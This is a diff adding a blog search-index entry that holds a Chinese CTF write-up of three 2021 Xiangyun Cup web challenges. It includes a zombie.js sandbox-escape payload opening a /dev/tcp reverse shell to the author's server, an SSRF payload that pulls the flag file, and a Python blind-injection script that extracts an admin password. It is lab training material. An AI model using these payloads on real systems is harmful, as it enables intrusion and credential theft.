@@ -1,6 +1,72 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2021祥云杯WEB-WP</title>
+    <url>/posts/20107/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>谢谢各位哥哥带我进前三十❤️，想写wp的时候i春秋那边已经关了环境，所以去buu进行了复现。不过题目暂时还没上全，所以先解已经上线的题目（后续题目上线再补全）。<br>
+团队完整wp地址：<a href="https://wp.n03tack.top/posts/62454/">https://wp.n03tack.top/posts/62454/</a></p>
+<h2 id="cralwer-z"><a class="header-anchor" href="#cralwer-z">¶</a>cralwer_z</h2>
+<p>zombie曾有个历史漏洞：<a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a> ，我们需要想办法成功利用这个漏洞<br>
+本题关键代码在user.js文件，在路由profile的post请求方法中，会将输入的<code>bucket</code>值赋值给<code>personalBucket</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/5%5D%7D%28A%7BCL%297ML_%29TSJK0U0%40Q.png" alt=""><br>
+而在verify路由中，如果token检验正确就会进入if方法，将<code>personalBucket</code>更新到<code>bucket</code>中<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%40HOT_4S%601YB%7BO%255XH78W%5DN2.png" alt=""><br>
+但是可以看到这里正则进行了严格的限制<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/Z0VT%5DDL_QX%7D%7B%40Q%244%5B%24DR9W6.png" alt=""><br>
+即我们只能输入<code>https://32位数字或者字母.oss-cn-beijing.ichunqiu.com/</code>的形式，输入其他的无法将<code>personalBucket</code>更新到<code>bucket</code>中，不过这里有个变量覆盖的问题</p>
+<ol>
+<li>我们先正常进行请求，会跳转到<code>/user/verify</code>，更新<code>bucket</code>的同时获得了token</li>
+<li>我们构造自己的ip地址，修改<code>personalBucket</code></li>
+<li>用第一步获得的token去请求<code>/user/verify</code>，会把<code>personalBucket</code>更新到<code>bucket</code>中，完成变量覆盖</li>
+</ol>
+<p>思路已经很明确了，我们先在自己的vps上面放一个 <strong>exp.html</strong> ，内容为zombie漏洞的exp，下面ip和端口改成自己的</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;c=<span class="string">&#x27;constructor&#x27;</span>;<span class="built_in">this</span>[c][c](<span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;var sync=require(&#x27;child_process&#x27;).spawnSync; var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;],);console.log(ls.output.toString());&quot;</span>)()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>然后就是进行正常请求，url会跳转到<code>verify</code>获取token<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/0VMW2NB8RHHVCT%5B598X5%28BU.png" alt="">然后因为<code>checkBucket</code>的限制，我们需要带上<code>oss-cn-beijing.ichunqiu.com</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/8MPYWXNW~G1L~6SFYC9O_F1.png" alt=""><br>
+所以我们<code>bucket</code>输入如下<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/741VRG5LHCP%5DP%28LDUC1G6HR.png" alt=""><br>
+然后就是再访问一次</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;7d064cc8-729a-478d-bc90-bdd45876b751.node4.buuoj.cn:81&#x2F;user&#x2F;verify?token&#x3D;aa647751ec8004b5745271304ab5ed38a149a9c76214e79e81c49dc934ac5e0f</span><br></pre></td></tr></table></figure>
+<p>我们输入的<code>personalBucket</code>成功更新到<code>bucket</code>中<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%60AN~A%40G%5B4H%5B28GE%25N3%5BU75M.png" alt=""><br>
+然后vps那边开启nc监听，浏览器访问<code>7d064cc8-729a-478d-bc90-bdd45876b751.node4.buuoj.cn:81/user/bucket</code>，成功反弹shell<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%405%7BFK%40%609XZI6XSP~8I%7DBMRR.png" alt=""></p>
+<h2 id="secrets-of-admin"><a class="header-anchor" href="#secrets-of-admin">¶</a>secrets_of_admin</h2>
+<p>在 <strong>database.ts</strong> 文件中可以得到admin的密码，密码为e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/DYVG7%28U%5B4%40O2%60T%28%2924%600G%5DH.png" alt=""><br>
+同时可以观察到flag文件在<code>superuser</code>这个账号中，继续查看 <strong>routes/index.ts</strong> 文件，可以发现此账号被限制登录了，用admin账号登录后，传上去的文件名变成了md5的形式，并且存到<code>superuser</code>账号里<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/%5BF_RGI44LOQB1LEE9S4%7D33J.png" alt=""><br>
+不过提供了另一个增加文件的方法<code>/api/files</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/FEJ%25%5DXU_W8%246KC%5B%40P2HN%7BRJ.png" alt=""><br>
+但限制了本地访问，不过我们可以通过前面的<code>/admin</code>post方法进行 <strong>ssrf</strong> 打本地，继续观察可发现对输入的<code>content</code>进行了过滤<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/%40DSP4UPVC%28R%25%7B%5B%60%7B%28_3F5VX.png" alt=""><br>
+可以用数组进行绕过，接着就是构造payload，把 <strong>superuser</strong> 的flag文件添加到 <strong>admin</strong> 账号下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content[]&#x3D;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;api&#x2F;files?username&#x3D;admin&amp;filename&#x3D;..&#x2F;files&#x2F;flag&amp;checksum&#x3D;be5a14a8e504a66979f6938338b0662c&quot;;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/S%5BX%28W1B%5BL3BVYOI4GCDZZ%5D9.png" alt=""><br>
+再访问flag文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;api&#x2F;files&#x2F;be5a14a8e504a66979f6938338b0662c</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/4UL%406Q%28~8SS%5B4N%40240%25M%29SD.png" alt=""></p>
+<h2 id="Package-Manager"><a class="header-anchor" href="#Package-Manager">¶</a>Package Manager</h2>
+<p>审计源码，在auth路由方法中存在sql注入漏洞<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/_7VOA6X1FYULMCSJ0P%25OXMD.png" alt=""><br>
+构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00f355689f5b7cb21e2a34346d9c55cd&quot;||(this.username&#x3D;&#x3D;&quot;admin&quot;&amp;&amp;this.password[i]&#x3D;&#x3D;&quot;j&quot;)||&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/HO18%25TL9MLYA0%6086%5B_6NQPL.png" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/HUOTM%60WE3O9R__X~%5D88KJO0.png" alt=""><br>
+存在盲注，所以写一个python脚本注出密码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/8/24 22:55</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b2ac6fa8-4eb4-4c98-9f24-c41b32060edc.node4.buuoj.cn:81/auth&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3Ad034-UqbmEKoZTjp_29TmqCvxuec67jE.E3VNBOuM%2BOpzxu%2Fi5ske43e80M2MLDu0FnLwEv9qmDI&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;00f355689f5b7cb21e2a34346d9c55cd\&quot;||(this.username==\&quot;admin\&quot;&amp;&amp;this.password[&#123;0&#125;]==\&quot;&#123;1&#125;\&quot;)||\&quot;&quot;</span>.format(i,chr(j))</span><br><span class="line">        data = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;sShk9REd-9QoAV2EvYHMOAPc6RQ0gjNdeyn4&quot;</span>, <span class="string">&quot;token&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url, cookies=cookies, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code==<span class="number">302</span>:</span><br><span class="line">            flag +=chr(j)</span><br><span class="line">            print(<span class="string">&quot;password:&quot;</span> + flag)</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/CZWE0KMO%29WR1TD62%40BCZ%29%5BD.png" alt=""><br>
+注出admin的密码为<code>!@#&amp;@&amp;@efefef*@((@))grgregret3r</code>，登录后就有flag<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/R%290QAR%40SD~R%24S1%40%7BW3GI926.png" alt=""></p>
+<h2 id="剩下的等buu更新"><a class="header-anchor" href="#剩下的等buu更新">¶</a>剩下的等buu更新</h2>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AoiAWD-萌新的得分利器</title>
     <url>/posts/16692/</url>
     <content><![CDATA[<h1>前言</h1>
